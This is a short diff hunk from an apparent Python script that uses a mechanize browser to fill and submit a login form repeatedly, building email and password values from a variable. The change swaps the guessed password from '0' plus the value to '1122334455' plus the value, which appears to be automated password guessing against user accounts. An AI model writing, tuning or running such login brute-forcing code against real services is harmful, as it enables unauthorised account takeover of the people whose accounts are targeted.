@@ -107,7 +107,7 @@ def home():
               site = br.open(login)
               br.select_form(nr=0)
               br.form['email'] = '0' + f
-              br.form['pass'] = '0' + f
+              br.form['pass'] = '1122334455' + f
               sub = br.submit()
               log = sub.geturl()
               print(A5thar)
